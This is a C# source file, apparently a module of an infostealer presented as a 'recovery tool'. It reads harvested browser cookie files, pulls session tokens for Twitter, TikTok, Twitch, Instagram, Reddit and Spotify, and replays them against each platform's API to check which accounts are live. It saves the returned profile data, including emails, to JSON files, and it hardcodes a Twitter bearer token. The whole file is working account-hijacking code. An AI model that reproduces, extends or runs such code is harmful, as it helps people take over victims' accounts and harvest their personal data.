using RecoveryTool.Recovery.Utilities;
using System.Text.Json;
using System.Text;
using System.Net.Http;
using System.Net.Http.Headers;

namespace RecoveryTool.Recovery.Browsers;

public static class AccountValidation
{
    private static readonly HttpClient _httpClient = new HttpClient();
    private static readonly Dictionary<(string Domain, string Name), string> _platformMap = new()
    {
        { ("twitter.com", "auth_token"), "twitter" },
        { ("tiktok.com", "sessionid"), "tiktok" },
        { ("twitch.tv", "auth-token"), "twitch" },
        { ("instagram.com", "sessionid"), "instagram" },
        { ("reddit.com", "reddit_session"), "reddit" },
        { ("spotify.com", "sp_dc"), "spotify" }
    };
    private const int MaxRetries = 3;
    private const int DelayMilliseconds = 500;

    public static async Task ValidateAccountsFromCookiesAsync()
    {
        var cookieFiles = Directory.EnumerateFiles(Common.recoveryBasePath, "Cookies.txt", SearchOption.AllDirectories);
        var tasks = new List<Task>();

        foreach (var file in cookieFiles)
        {
            var lines = await ReadAllLinesWithRetryAsync(file);
            if (lines == null) continue;

            foreach (var line in lines)
            {
                var parts = line.Split('\t');
                if (parts.Length < 7) continue;
                var domain = parts[0];
                var name = parts[5];
                var value = parts[6];

                foreach (var ((keyDomain, keyName), platform) in _platformMap)
                {
                    if (domain.Contains(keyDomain) && name == keyName)
                    {
                        tasks.Add(ProcessValidationAsync(platform, value));
                        break;
                    }
                }
            }
        }

        await Task.WhenAll(tasks);
    }

    private static async Task<string[]?> ReadAllLinesWithRetryAsync(string path)
    {
        for (int i = 0; i < MaxRetries; i++)
        {
            try
            {
                return await File.ReadAllLinesAsync(path);
            }
            catch (IOException) when (i < MaxRetries - 1)
            {
                await Task.Delay(DelayMilliseconds);
            }
            catch
            {
                return null;
            }
        }
        return null;
    }

    private static async Task ProcessValidationAsync(string platform, string cookie)
    {
        JsonDocument? result = platform.ToLower() switch
        {
            "twitter" => await ValidateTwitterAsync(cookie),
            "tiktok" => await ValidateTikTokAsync(cookie),
            "twitch" => await ValidateTwitchAsync(cookie),
            "instagram" => await ValidateInstagramAsync(cookie),
            "reddit" => await ValidateRedditAsync(cookie),
            "spotify" => await ValidateSpotifyAsync(cookie),
            _ => null
        };

        if (result != null)
        {
            string destinationPath = Common.EnsureAccountValidationPath();
            string filePath = Path.Combine(destinationPath, $"{platform}.json");
            await File.WriteAllTextAsync(filePath, result.RootElement.GetRawText());
        }
    }

    private static async Task<JsonDocument?> ValidateTwitterAsync(string authToken)
    {
        var request = new HttpRequestMessage(HttpMethod.Post, "https://twitter.com/i/api/1.1/account/update_profile.json");
        request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", "AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA");
        request.Headers.Add("cookie", $"auth_token={authToken}");
        var response = await _httpClient.SendAsync(request);
        return response.IsSuccessStatusCode ? JsonDocument.Parse(await response.Content.ReadAsStringAsync()) : null;
    }

    private static async Task<JsonDocument?> ValidateTikTokAsync(string sessionId)
    {
        var request = new HttpRequestMessage(HttpMethod.Get, "https://www.tiktok.com/passport/web/account/info/");
        request.Headers.Add("cookie", $"sessionid={sessionId}");
        var response = await _httpClient.SendAsync(request);
        return response.IsSuccessStatusCode ? JsonDocument.Parse(await response.Content.ReadAsStringAsync()) : null;
    }

    private static async Task<JsonDocument?> ValidateTwitchAsync(string authToken)
    {
        var query = new
        {
            query = @"
                query {
                    user {
                        id
                        login
                        displayName
                        email
                        hasPrime
                        isPartner
                        followers {
                            totalCount
                        }
                    }
                }"
        };
        var content = new StringContent(JsonSerializer.Serialize(query), Encoding.UTF8, "application/json");
        var request = new HttpRequestMessage(HttpMethod.Post, "https://gql.twitch.tv/gql")
        {
            Content = content
        };
        request.Headers.Authorization = new AuthenticationHeaderValue("OAuth", authToken);
        var response = await _httpClient.SendAsync(request);
        return response.IsSuccessStatusCode ? JsonDocument.Parse(await response.Content.ReadAsStringAsync()) : null;
    }

    private static async Task<JsonDocument?> ValidateInstagramAsync(string sessionId)
    {
        var request = new HttpRequestMessage(HttpMethod.Get, "https://i.instagram.com/api/v1/accounts/current_user/?edit=true");
        request.Headers.Add("cookie", $"sessionid={sessionId}");
        var response = await _httpClient.SendAsync(request);
        return response.IsSuccessStatusCode ? JsonDocument.Parse(await response.Content.ReadAsStringAsync()) : null;
    }

    private static async Task<JsonDocument?> ValidateRedditAsync(string redditSession)
    {
        var request = new HttpRequestMessage(HttpMethod.Get, "https://oauth.reddit.com/api/v1/me");
        request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", redditSession);
        var response = await _httpClient.SendAsync(request);
        return response.IsSuccessStatusCode ? JsonDocument.Parse(await response.Content.ReadAsStringAsync()) : null;
    }

    private static async Task<JsonDocument?> ValidateSpotifyAsync(string spDc)
    {
        var request = new HttpRequestMessage(HttpMethod.Get, "https://www.spotify.com/api/account-settings/v1/profile");
        request.Headers.Add("cookie", $"sp_dc={spDc}");
        var response = await _httpClient.SendAsync(request);
        return response.IsSuccessStatusCode ? JsonDocument.Parse(await response.Content.ReadAsStringAsync()) : null;
    }
}
